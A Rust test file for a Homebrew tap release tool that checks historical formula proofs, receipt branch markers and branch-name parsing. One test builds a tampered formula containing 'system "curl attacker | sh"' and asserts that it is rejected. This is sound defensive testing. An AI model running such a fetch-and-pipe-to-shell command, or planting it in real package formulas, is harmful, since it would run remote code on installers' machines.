use super::identity::{belongs_to_receipt, branch_base, branch_prefix};

#[test]
fn historical_formula_proof_uses_its_own_head_and_base_bytes() {
    let fixture = crate::homebrew::test_support::fixture();
    let old_base_sha = "b".repeat(40);
    let sdk_artifact_digest = "c".repeat(64);
    let old_proof = reconstruct(
        &fixture,
        &sdk_artifact_digest,
        &old_base_sha,
        &fixture.base_formula,
        &fixture.proposed_formula,
    )
    .expect("original base to original head formula is canonical");

    let evolved_base = render_base_for_source(&fixture, &"d".repeat(40));
    let unrecognized_base = String::from_utf8(evolved_base.clone())
        .expect("formula is UTF-8")
        .replace(
            "bin.install \"cli\"",
            "bin.install \"cli\"\n    # trusted install logic evolved",
        )
        .into_bytes();
    assert!(
        reconstruct(
            &fixture,
            &sdk_artifact_digest,
            &"c".repeat(40),
            &unrecognized_base,
            &fixture.proposed_formula,
        )
        .is_err(),
        "a base with unrecognized formula logic is rejected"
    );
    let current_proof = reconstruct(
        &fixture,
        &sdk_artifact_digest,
        &"c".repeat(40),
        &evolved_base,
        &fixture.proposed_formula,
    )
    .expect("a recognized older formula base to this receipt's canonical formula");
    assert_eq!(current_proof.base_sha, "c".repeat(40));
    assert_eq!(
        current_proof.old_formula_sha256,
        crate::tap_prepare::sha256(&evolved_base)
    );
    assert_eq!(
        current_proof.formula_spec_digest,
        fixture.spec.digest().expect("spec digest")
    );
    assert_eq!(current_proof.sdk_artifact_digest, sdk_artifact_digest);
    assert_ne!(
        velnor_actions_contract::canonical_json_bytes(&old_proof).expect("old proof bytes"),
        velnor_actions_contract::canonical_json_bytes(&current_proof).expect("current proof bytes")
    );

    let malicious = String::from_utf8(fixture.proposed_formula.clone())
        .expect("formula is UTF-8")
        .replace("bin.install \"cli\"", "system \"curl attacker | sh\"");
    assert!(
        reconstruct(
            &fixture,
            &sdk_artifact_digest,
            &old_base_sha,
            &fixture.base_formula,
            malicious.as_bytes(),
        )
        .is_err(),
        "historical head code changes are rejected"
    );
}

fn reconstruct(
    fixture: &crate::homebrew::test_support::TapFixture,
    sdk_artifact_digest: &str,
    base_sha: &str,
    base_formula: &[u8],
    proposed_formula: &[u8],
) -> Result<crate::tap_prepare::HomebrewTapPreparationProof, crate::OrchestratorError> {
    super::reconstruct_historical_proof(crate::tap_prepare::HistoricalCandidateInput {
        source_repository: &fixture.plan.repository,
        tap: &fixture.policy,
        plan: &fixture.plan,
        release: &fixture.release,
        spec: &fixture.spec,
        sdk_artifact_digest,
        base_sha,
        base_formula,
        proposed_formula,
    })
}

fn render_base_for_source(
    fixture: &crate::homebrew::test_support::TapFixture,
    source_sha: &str,
) -> Vec<u8> {
    use velnor_actions_contract::homebrew_spec::{
        HomebrewFormulaReleaseLiterals, render_homebrew_formula, validate_homebrew_projection,
    };

    let projection =
        validate_homebrew_projection(&fixture.spec, &fixture.plan).expect("fixture projection");
    let assets = projection
        .selected_payloads()
        .iter()
        .map(|payload| (payload.asset_name().to_owned(), "a".repeat(64)))
        .collect();
    let literals = HomebrewFormulaReleaseLiterals::new(
        &fixture.spec,
        &projection,
        source_sha.to_owned(),
        format!("1.2.3-preview.8+{}", &source_sha[..7]),
        format!("preview-{source_sha}"),
        assets,
    )
    .expect("alternate base literals");
    render_homebrew_formula(&fixture.spec, &literals).expect("alternate base formula")
}

#[test]
fn receipt_history_requires_both_exact_body_and_deterministic_branch_markers() {
    let digest = format!("b3-{}", "a".repeat(64));
    let prefix = branch_prefix(
        &digest,
        velnor_actions_contract::package_release::PackageReleaseChannel::Preview,
    )
    .expect("valid receipt digest");
    let marker = format!("Receipt digest: `{digest}`");
    let branch = format!("{prefix}{}", "b".repeat(40));
    assert!(belongs_to_receipt(&branch, &marker, &prefix, &marker).is_ok_and(|value| value));
    assert!(
        belongs_to_receipt("feature/other", "unrelated", &prefix, &marker)
            .is_ok_and(|value| !value)
    );
    assert!(belongs_to_receipt(&branch, "unrelated", &prefix, &marker).is_err());
    assert!(
        belongs_to_receipt("feature/other", &marker, &prefix, &marker).is_ok_and(|value| !value)
    );
}

#[test]
fn receipt_branch_binds_the_full_digest_and_full_base_sha() {
    let digest = format!("b3-{}", "c".repeat(64));
    let prefix = branch_prefix(
        &digest,
        velnor_actions_contract::package_release::PackageReleaseChannel::Preview,
    )
    .expect("valid receipt digest");
    let base = "d".repeat(40);
    assert!(
        branch_base(
            &digest,
            &format!("{prefix}{base}"),
            velnor_actions_contract::package_release::PackageReleaseChannel::Preview
        )
        .is_ok_and(|value| value == base)
    );
    assert!(
        branch_base(
            &digest,
            &format!("{prefix}{}", "D".repeat(40)),
            velnor_actions_contract::package_release::PackageReleaseChannel::Preview
        )
        .is_err()
    );
    assert!(
        branch_prefix(
            "b3-deadbeef",
            velnor_actions_contract::package_release::PackageReleaseChannel::Preview
        )
        .is_err()
    );
}
